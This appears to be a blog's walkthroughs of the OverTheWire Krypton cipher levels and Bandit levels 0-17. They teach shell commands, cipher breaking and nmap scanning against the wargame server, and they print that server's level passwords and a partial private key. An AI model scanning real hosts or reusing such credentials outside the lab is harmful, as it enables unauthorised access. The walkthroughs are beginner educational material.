\"\" for letter in cipher_text: if letter not in real_freq: real_text += letter else: real_text += real_freq[cipher_freq.find(letter)] print real_text This should do it. Spoiler alert that doesn’t do it. In fact the frequency analysis goes deeper than this since some letters have a wrong correspondence, so you would have to do analysis of bigrams and trigrams. I started making a more advanced script but then i found a good website that does it. https://www.guballa.de/substitution-solver As you can see the text makes sense even though it’s broken into 5 characters. This should do it as our correct decryption key. We just need to change a few things in our script. NOTE: I worked on my own computer instead of in the normal ssh connection. real_alphabet = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" cipher_alphabet = \"QAZWSXEDCRFVTGBYHNUJMIKOLP\" cipher_text = \"KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS\" real_text = \"\" for letter in cipher_text: if letter not in real_alphabet: real_text += letter else: real_text += real_alphabet[cipher_alphabet.find(letter)] print real_text \u003e python ~/Desktop/krypton3/simple_crack.py WELLD ONETH ELEVE LFOUR PASSW ORDIS BRUTE \u003e We got the password! This would be much harder if we hadn’t find that online tool. Next one! ","date":"07-07-2019","objectID":"/krypton/:4:0","tags":["beginner","crypto"],"title":"Over The Wire - Krypton Walkthrough","uri":"/krypton/"},{"categories":["Posts"],"content":"Level 4 So now we have a vigenere cipher. This kind of cipher is the result of adding the plaintext with a key, so now a character doesn’t have a direct correspondence since it depends which character of the key was added. If you search online you will eventually understand that we can just apply the same logic as before but you have to use modulus. We can use this, to decode and do the analysis for us. As we can see here, there are multiple possible keys, but the one that makes sense and transforms our cipher text into readable text is the first one. In this case our key is FREKEY So when we decrypt our encrypted text we get the following Without the spaces of course. ","date":"07-07-2019","objectID":"/krypton/:5:0","tags":["beginner","crypto"],"title":"Over The Wire - Krypton Walkthrough","uri":"/krypton/"},{"categories":["Posts"],"content":"Level 5 Once again we can use the website previously mentioned. They suggest KEYZTBGTH as the key. This seems random, but if we look closer there’s KEY and then ends in GTH it seems like KEYLENGTH we should try to decrypt using KEYLENGTH as the key. Ok we got the word RANDOM it can’t be coincidence. After trying to connect, you can see that the password is right. ","date":"07-07-2019","objectID":"/krypton/:6:0","tags":["beginner","crypto"],"title":"Over The Wire - Krypton Walkthrough","uri":"/krypton/"},{"categories":["Posts"],"content":"This is a walkthrough of the Bandit challenge provided by Over The Wire. This is mainly focused on SSH interaction and some basic bash commands.","date":"06-07-2019","objectID":"/bandit/","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Introduction Over The Wire provides multiple challenges focused on different topics of computer systems. The one which we will solve here is Bandit. This is focused on SSH communication, bash commands and some basic UNIX concepts. To connect to any of these levels you need 2 things: a username, and a password. Each level has a username in the format bandit\u003clevel_number\u003e (without the ‘\u003c’ ‘\u003e’) so for level 0 the username would be bandit0. Then each level also has a password. Usually you find the password for the next level on the current one, this meaning that in level 0 you will find the password for level 1, which you will login with bandit1 and the password you found. You can read more about the challenge and how it works here. Levels: Introduction Level 0 Level 1 Level 2 Level 3 Level 4 Level 5 Level 6 Level 7 Level 8 Level 9 Level 10 Level 11 Level 12 Level 13 Level 14 Level 15 Level 16 Level 17 Level 18 Level 19 Level 20 Level 21 Level 22 Level 23 Level 24 Level 25 Level 26 Level 27 Level 28 Level 29 Level 30 Level 31 Level 32 Level 33 Level 34 ","date":"06-07-2019","objectID":"/bandit/:0:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 0 So we need to login as bandit0 using the password bandit0 at bandit.labs.overthewire.org using SSH. It’s also said that the connection should be done to port 2220. We can use the man command followed by ssh to get information on how to use ssh. The man command is super useful, but sometimes can present you with more information then you need. A nice alternative is the tldr command which you can install through your package manager (have in mind that you won’t be able to use it once you login through ssh since you can’t install anything in the bandit machine). It also takes the command that you want to see more information as an argument but it shows you some examples frequently used. So by doing tldr ssh we get one of the lines saying Connect to a remote server using a specific port: ssh username@remote_host -p 2222 which we can change with the arguments we have, resulting in ssh bandit0@bandit.labs.overthewire.org -p 2220. Now we know how to make a basic ssh connection with a username and a port. After we execute the command a password is asked. We insert bandit0 and finally we have an open ssh connection, which we can see by the prompt bandit0@bandit:~$. Ok now we can go to the next level. ","date":"06-07-2019","objectID":"/bandit/:1:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 1 We will use the connection established in Level 0 to solve this level. They say that the password for the next level is stored in the file called readme. To print the content of the file we can use the cat command which takes the file you want to see. bandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1 So now that we have the password we can go to the next level. ","date":"06-07-2019","objectID":"/bandit/:2:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 2 In this level the password is in a file called -. The problem here is that the character - is used as a special character to represent stdin (more information on this here), so in this case we should be able to see its content if we specify the filename in a path format like bandit1@bandit:~$ cat ./- CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 The . means the current directory, so what we are representing is the current directory, which inside has a file named -. ","date":"06-07-2019","objectID":"/bandit/:3:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 3 So now the file that we want to see is called spaces in this filename. The challenge here is that if we do like before and use the command cat followed by the name we get this bandit2@bandit:~$ cat spaces in this filename cat: spaces: No such file or directory cat: in: No such file or directory cat: this: No such file or directory cat: filename: No such file or directory Wait what??? So the problem here is that as we’ve seen before commands take arguments so what we are doing is calling the cat command with 4 arguments: spaces, in, this and filename. This is not what we want at all. What we want is to print the file named spaces in this filename. So the way to do it is to give it to the command as a whole string by surrounding it with \". bandit2@bandit:~$ cat \"spaces in this filename\" UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Onto the next level. ","date":"06-07-2019","objectID":"/bandit/:4:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 4 Now the file that contains the password is a hidden file and is in the inhere directory. To change directory we use the cd command. bandit3@bandit:~$ cd inhere Now we know that we are in the inhere directory because the bash prompt says it bandit3@bandit:~/inhere$. If we list the files in the current directory, which we can do by executing the command ls we get a blank listing. bandit3@bandit:~/inhere$ ls bandit3@bandit:~/inhere$ Ok it makes sense. The challenge said that the file was hidden. You can search a bit about hidden files in UNIX systems and you will eventually find out that by convention the hidden files start with a .. To list hidden files you can do man ls and see that there is a flag that you can pass to list all entries, not ignoring those starting with . (to quit man simply hit q). bandit3@bandit:~/inhere$ ls -a . .. .hidden Ok as we can see there is a file named .hidden that should be the one (the other two ., .. are the current directory and the parent directory respectively). bandit3@bandit:~/inhere$ cat .hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB So by using cat with the filename we can then get the password for the next level. ","date":"06-07-2019","objectID":"/bandit/:5:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 5 So now the password is stored in the only human-readable file in the inhere directory. As we’ve seen before to change directory we can use the cd command. Then we can list the files in the current directory by using ls (i use the -l flag just to display it as a vertical listing). bandit4@bandit:~/inhere$ ls -l total 40 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file00 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file01 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file02 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file03 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file04 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file05 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file06 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file07 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file08 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file09 Ok so we have 10 files. The listing doesn’t tells us much about them. On the other hand one of suggested commands file can tell us interesting things about each file, maybe know which one is human-readable we hope. So what we can do is calling file on all the files in this directory. There are two ways to do this: the bruteforce way and the smart way. The bruteforce way is to run file -fileXX (replacing XX for the file number) for each file in the directory. The smart way is to use the symbol * that matches with every file name, this meaning that using * or every filename separated by spaces is the same. bandit4@bandit:~/inhere$ file * file: Cannot open `ile00' (No such file or directory). file: Cannot open `ile01' (No such file or directory). file: Cannot open `ile02' (No such file or directory). file: Cannot open `ile03' (No such file or directory). file: Cannot open `ile04' (No such file or directory). file: Cannot open `ile05' (No such file or directory). file: Cannot open `ile06' (No such file or directory). file: Cannot open `ile07' (No such file or directory). file: Cannot open `ile08' (No such file or directory). file: Cannot open `ile09' (No such file or directory). “Wait… You said this was the smart way and it didn’t work, that doesn’t seem very smart to me.” I know, i know just give me a chance. So the problem here is that the files begin by a -, and we’ve encountered this problem before. Let’s do as we did before by putting the filenames in a path like format, so ./*. bandit4@bandit:~/inhere$ file ./* ./-file00: data ./-file01: data ./-file02: data ./-file03: data ./-file04: data ./-file05: data ./-file06: data ./-file07: ASCII text ./-file08: data ./-file09: data Ohhh so now it worked, okay. This tells us that the only file that has an ASCII text type is -file07. This is the one. So we use cat no surprise there and we get bandit4@bandit:~/inhere$ cat ./-file07 koReBOKuIDDepwhWk7jZC0RTdopnAYKh Done. Next level. ","date":"06-07-2019","objectID":"/bandit/:6:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 6 So now the password is in a file stored in the inhere directory and has three properties: human-readable 1033 bytes in size not executable So lets cd onto inhere and the list its content. bandit5@bandit:~/inhere$ ls -l total 80 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere00 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere01 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere02 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere03 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere04 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere05 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere06 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere07 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere08 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere09 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere10 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere11 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere12 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere13 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere14 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere15 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere16 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere17 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere18 drwxr-x--- 2 root bandit5 4096 Oct 16 2018 maybehere19 Ok so here bruteforce might not be worth it since each of those entries is a directory and has multiple files. We can use one of the suggested commands named find which, guess what, finds stuff. So to learn a bit about find you can use man and just so you know you can search words in man by hitting / and then typing the word you want to lookup. We can lookup size and readable in there which will give us 2 flags to use: -size and -readable. -size works with the number of units you want followed by the character that represents the unit. So in our case we want 1033 bytes, so the result will be -size 1033c. The readable flag needs no argument. The final command is: bandit5@bandit:~/inhere$ find -size 1033c -readable ./maybehere07/.file2 find searches by default in your current directory. The result is only one file so we don’t need to care about it being executable or not. bandit5@bandit:~/inhere$ cat ./maybehere07/.file2 DXjZPULLxYr17uwoI01bNLQbtFemEgo7 Onto the next level. ","date":"06-07-2019","objectID":"/bandit/:7:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 7 In this level the password is stored somewhere in the server with a few properties: owned by user bandit7 owned by group bandit6 33 bytes in size find should do the job here as well, it’s just a matter of finding the flags associated with the functionalities. We already know how to use the -size so that’s going to be -size 33c. After digging a bit in the man, we can see that -user and -group do what we want. bandit6@bandit:~$ find -user bandit7 -group bandit6 -size 33c bandit6@bandit:~$ Wait… No file matched what we wanted. The trick here is that it says somewhere in the server so to search everywhere and not just the current directory we have to give the / directory (which is the root) as an argument to find. bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c find: ‘/run/lvm’: Permission denied (...more...) find: ‘/var/cache/apt/archives/partial’: Permission denied /var/lib/dpkg/info/bandit7.password find: ‘/var/lib/apt/lists/partial’: Permission denied (...more...) find: ‘/boot/lost+found’: Permission denied Well as you can see there are a lot of errors but the file is there. If you want to clean it up you can redirect the error output to /dev/null so the errors don’t show up. bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c 2\u003e /dev/null /var/lib/dpkg/info/bandit7.password Ok so we found the file. We just need to use cat and we should get the password. bandit6@bandit:~$ cat $(find / -user bandit7 -group bandit6 -size 33c 2\u003e /dev/null) HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs Quick note, what i did in the previous command was telling bash that cat took the result of another command (find) as an argument, we do this by surrounding it with $(). This tells bash that what’s inside is not only text, it’s actually a command. So then the resulting output of the find command /var/lib/dpkg/info/bandit7.password will be an argument to cat. ","date":"06-07-2019","objectID":"/bandit/:8:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 8 New challenge. The password is stored in the file data.txt next to the word millionth. Ok so let’s see the content of the file. bandit7@bandit:~$ cat data.txt humiliation's 47r0YuNylaQ3k6HqGF5NsPPiGuolDCjn malarkey's 0huyJeRwvtJaoyRmJjQFsRnQcYG4gDir (...A LOT MORE...) chemical 7D5J0CAJMWr2Ryb9uB0kSRuqz7BQPv6X shaded v5MBdtwMnmZ9YlheYVOxBJiOSxp9BeAA We won’t be able to find this just by seeing the file’s content, we will need some sort of finder, but for a file’s content. So once again we will see the suggested commands, and one that fits our needs is grep. Now a way we can do this is by using the file’s content as the content to look in. On the man grep page it says that you can pass the file as an argument, the other way is that if you don’t specify a file grep will use the standard input. So the first way of doing this is: bandit7@bandit:~$ grep millionth data.txt millionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV Easy. Another way that teaches you a few other concepts is doing it like this: bandit7@bandit:~$ cat data.txt | grep millionth millionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV What we are doing here is called pipelining commands. What it does is using the output of the first command as the input of the second one, so grep will use the standard input (which will be the output produced by cat) to search the term millionth. Onto the next level. ","date":"06-07-2019","objectID":"/bandit/:9:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 9 Now the password is still stored in data.txt but now they say is the only line that is unique. We will cat the file just to see its content bandit8@bandit:~$ cat data.txt KerqNiDbY0zV2VxnOCmWX5XWxumldlAe MsxcvOe3PGrt78wpZG2bBNF5wfXpZhET (...more...) YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXE DXI6y5CNPU06rVpkoZgnZJBWfkdW131j So once again we won’t be able to get the unique line without using a few tools. There is a suggested command named uniq, sounds like what we need by checking the man page. So the way to use the command is by passing the flag -u that tells uniq to only print unique lines. bandit8@bandit:~$ uniq -u data.txt KerqNiDbY0zV2VxnOCmWX5XWxumldlAe MsxcvOe3PGrt78wpZG2bBNF5wfXpZhET (...more...) YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXE DXI6y5CNPU06rVpkoZgnZJBWfkdW131j Wait… It gave us the same. Let’s check the man page again. NAME uniq - report or omit repeated lines SYNOPSIS uniq [OPTION]... [INPUT [OUTPUT]] DESCRIPTION Filter adjacent matching lines from INPUT (or standard input), writing to OUTPUT (or standard output). Ok then. So it only filters adjacent matching lines. So what we could do is sort the lines so that all the repeated lines be adjacent to one another. Guess what, one of the suggested commands is sort, that should do it. We look a bit into the man page to see how it works and is nothing special, sort followed by the file name. Now sort writes to the standard output so what we can do is pipelining, check Level 8 for more information on this. bandit8@bandit:~$ sort data.txt | uniq -u UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR Ok there we go. We have the password, let’s go to the next level. ","date":"06-07-2019","objectID":"/bandit/:10:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 10 Now the password is stored in the file data.txt and is one of the few human-readable strings, beginning with several = characters. Now we already know what a few of the suggested commands do, so we know they’re not quite what we want. Let’s check out strings. NAME strings - print the strings of printable characters in files. Ok. We can try combining strings with grep in order to get only the strings that have a =. bandit9@bandit:~$ strings data.txt | grep = 2========== the ========== password \u003et= yP rV~dHm= ========== isa =FQ?P\\U = F[ pb=x J;m= =)$= ========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk iv8!= Ok we can assume the password is the penultimate line, minus the =s of course. ","date":"06-07-2019","objectID":"/bandit/:11:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 11 Now the password is still stored in data.txt but encoded with base64. There is a suggested command named base64 that might be useful. NAME base64 - base64 encode/decode data and print to standard output Ok, it can decode base64 so that should do it. To decode we use the -d flag. bandit10@bandit:~$ base64 -d data.txt The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR DJ Khaled Voice: Another one ","date":"06-07-2019","objectID":"/bandit/:12:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 12 The password is stored in the file data.txt, but all lowercase and uppercase letters have been rotated 13 positions. This is called ROT13 (you can google it to get some more information on this). It’s a ceasar’s cipher with the n equal to 13 (you can google this as well). So by checking out the suggested commands there are a few that we already know that are not suitable for this. One of the new ones is tr. Let’s check the man page. NAME tr - translate or delete characters Ok. So it translates characters. I guess that’s what we kind of want. We want to translate ‘a’ to 13 positions ahead. So a quick google of tr ROT13 would land us on the Wikipedia page. In the page there is an implementation of ROT13 using tr. We can kind of reverse engineer it and get what we want. This is the way to encode tr 'A-Za-z' 'N-ZA-Mn-za-m', so to decode it should be the other way around right? tr 'N-ZA-Mn-za-m' 'A-Za-z' Well let’s try it. tr uses the standard input, so we will pipeline it using cat. bandit11@bandit:~$ cat data.txt | tr 'N-ZA-Mn-za-m' 'A-Za-z' The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu Perfect. Next level. ","date":"06-07-2019","objectID":"/bandit/:13:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 13 Let’s see the challenge description, The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!) Ok understood. Let’s follow the useful tips. bandit12@bandit:~$ mkdir /tmp/dirforfiles Now we have a directory to work with our files. Let’s copy our file in there first bandit12@bandit:~$ cp data.txt /tmp/dirforfiles Done. Let’s change our current directory to the one we created. bandit12@bandit:~$ cd /tmp/dirforfiles bandit12@bandit:/tmp/dirforfiles$ So they said that the file was a hexdump let’s check xxd’s man page. NAME xxd - make a hexdump or do the reverse. Ok what we want is to reverse it back to it’s original state. We use the -r flag to do this. bandit12@bandit:/tmp/dirforfiles$ xxd -r data.txt �▒▒h��6��@4▒bi���h▒91AY\u0026SY���������ϟ���������������׽��9�� �mF�h�h44 ▒��B��,0�� ��4@�����@2▒C@h�� � �ɋ�^-K�����}�\\,�▒ǿ�}E�F�_!r�U�g?E�i��9x��TB@�lȲ���BF.hM�SC4�V�F��R�Br\"�\u003c(Hت$$���KBs��%l▒~�_�▒ݿ����g�zM�w�#P\"2@������ ��\\��WQO4�p�i�����S�#\u0026��/�#��[j▒�\u003cD�uԐ^_�H.�-��wAt �[��UP�G�CP��\u0026:�2�*�)�\\�������H� �\\�7��w\u003cbandit12@bandit:/tmp/dirforfiles$ Ok. I think i broke it… So what happened was that xxd reversed it back to a binary but wrote the result to the standard output. Let’s redirect it to a file. bandit12@bandit:/tmp/dirforfiles$ xxd -r data.txt \u003e original bandit12@bandit:/tmp/dirforfiles$ Ok. It worked. Let’s check what we are dealing with by using the file command to check some more information on the file we just created. bandit12@bandit:/tmp/dirforfiles$ file original original: gzip compressed data, was \"data2.bin\", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix So it’s a gzip file, let’s learn how to decompress it by checking man gzip. So there is a flag -d that is used to decompress, let’s do it. bandit12@bandit:/tmp/dirforfiles$ gzip -d original gzip: original: unknown suffix -- ignored Hmmm… Weird. The suffix is what goes at the end of the filename i guess… OH RIGHT the file extension. This file has no extension and gzip doesn’t like it. Let’s give it a proper name. bandit12@bandit:/tmp/dirforfiles$ mv original original.gz Ok now let’s try it again. bandit12@bandit:/tmp/dirforfiles$ gzip -d original.gz bandit12@bandit:/tmp/dirforfiles$ Ok no error. It worked i assume. Now we can list the dir to see what we have. bandit12@bandit:/tmp/dirforfiles$ ls -la total 1896 drwxr-sr-x 2 bandit12 root 4096 Jun 29 16:12 . drwxrws-wt 54536 root root 1925120 Jun 29 16:14 .. -rw-r----- 1 bandit12 root 2581 Jun 29 16:04 data.txt -rw-r--r-- 1 bandit12 root 572 Jun 29 16:09 original Ok so the file named original is the result of the decompression. Let’s analyze it again with the file command. bandit12@bandit:/tmp/dirforfiles$ file original original: bzip2 compressed data, block size = 900k So now it’s compressed with bzip2. TO THE MAN PAGE! Once again the -d flag does it. bandit12@bandit:/tmp/dirforfiles$ bzip2 -d original bzip2: Can't guess original name for original -- using original.out Hm… I guess it worked. bzip2 isn’t as picky as gzip with the whole file extension thing. It just warned us that it couldn’t guess the original name so it just used that one. That’s ok for us. Let’s use file again. bandit12@bandit:/tmp/dirforfiles$ file original.out original.out: gzip compressed data, was \"data4.bin\", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix Ohhh back to gzip. I know this one. We have to change the file extension before decompressing it. bandit12@bandit:/tmp/dirforfiles$ mv original.out original.gz Now decompress it. bandit12@bandit:/tmp/dirforfiles$ gzip -d original.gz bandit12@bandit:/tmp/dirforfiles$ ls -la total 1912 drwxr-sr-x 2 bandit12 root 4096 Jun 29 16:21 . drwxrws-wt 54538 root root 1925120 Jun 29 16:","date":"06-07-2019","objectID":"/bandit/:14:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 14 So new level, new challenge. The password is stored in a file but can only be read by the bandit14 (we are bandit13). They give us a SSH key to login to next level though. If whe check the man page we learn that we can use the -i flag to use a private key to login. Let’s try it. bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost (...connection established text...) bandit14@bandit:~$ Ok we got a prompt as bandit14. Have in mind that you’re 2 levels deep in ssh connections. Now we can cat the password file mentioned previously. bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Onto the next one. ","date":"06-07-2019","objectID":"/bandit/:15:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 15 We can get the password for the next user if we submit the current one to port 30000. We can use nc (netcat) to make simple TCP and UDP connections let’s try it. nc takes a host and a port to connect to. Let’s try it then. bandit14@bandit:~$ nc localhost 30000 Ok now we can write the password. bandit14@bandit:~$ nc localhost 30000 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Correct! BfMYroe26WYalil77FoDi9qh59eK5xNr Next please. ","date":"06-07-2019","objectID":"/bandit/:16:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 16 This challenge has a few important notes so i’ll just paste it here The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption. Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command… So we have a suggested command named openssl and our port is using ssl encryption. Let’s check the man page. In the man page there is a field named s_client which says that implements a generic SSL/TLS client. That should do it. Let’s check the man s_client page. Ok we can use the -connect flag to insert the address and the port. Let’s do it. bandit15@bandit:~$ openssl s_client -connect localhost:30001 (...bunch of information...) Now we can type our current password to get the new one. bandit15@bandit:~$ openssl s_client -connect localhost:30001 (...bunch of information...) BfMYroe26WYalil77FoDi9qh59eK5xNr Correct! cluFn7wTiGryunymYOu4RcffSxQluehd closed Ok we got it. Next one. ","date":"06-07-2019","objectID":"/bandit/:17:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 17 Now they give us a range of ports to which we have to submit the current password. Let’s not bruteforce it. We can use nmap to give us some information on the ports. Check the man page. We can use the -p flag to scan port ranges. bandit16@bandit:~$ nmap localhost -p31000-32000 Starting Nmap 7.40 ( https://nmap.org ) at 2019-06-29 17:49 CEST Nmap scan report for localhost (127.0.0.1) Host is up (0.00021s latency). Not shown: 999 closed ports PORT STATE SERVICE 31518/tcp open unknown 31790/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds So we have 2 ports open. Now we can do a service scan in both ports and see the results. To do a service scan we use the -sV flag. bandit16@bandit:~$ nmap localhost -p T:31518,31790 -sV Starting Nmap 7.40 ( https://nmap.org ) at 2019-06-29 17:52 CEST Stats: 0:01:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 17:54 (0:01:18 remaining) Stats: 0:01:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 17:54 (0:01:23 remaining) Nmap scan report for localhost (127.0.0.1) Host is up (0.00013s latency). PORT STATE SERVICE VERSION 31518/tcp open ssl/echo 31790/tcp open ssl/unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port31790-TCP:V=7.40%T=SSL%I=7%D=6/29%Time=5D17893D%P=x86_64-pc-linux-g SF:nu%r(GenericLines,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cu SF:rrent\\x20password\\n\")%r(GetRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the SF:\\x20correct\\x20current\\x20password\\n\")%r(HTTPOptions,31,\"Wrong!\\x20Plea SF:se\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(RTSPRequest, SF:31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\ SF:n\")%r(Help,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x SF:20password\\n\")%r(SSLSessionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20 SF:correct\\x20current\\x20password\\n\")%r(TLSSessionReq,31,\"Wrong!\\x20Please SF:\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(Kerberos,31,\"W SF:rong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r SF:(FourOhFourRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20c SF:urrent\\x20password\\n\")%r(LPDString,31,\"Wrong!\\x20Please\\x20enter\\x20the SF:\\x20correct\\x20current\\x20password\\n\")%r(LDAPSearchReq,31,\"Wrong!\\x20Pl SF:ease\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(SIPOptions SF:,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password SF:\\n\"); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 88.36 seconds (This scan might take a bit) Ok so both of them speak SSL, but one of them is an echo service as we can see. This was an overkill since we could’ve just tried both, but now you know how to do it properly (imagine if you had 300 ports). The port we want is 31790, lets submit the password using openssl s_client. bandit16@bandit:~$ openssl s_client -connect localhost:31790 (...bunch of ssl information...) cluFn7wTiGryunymYOu4RcffSxQluehd Correct! -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A 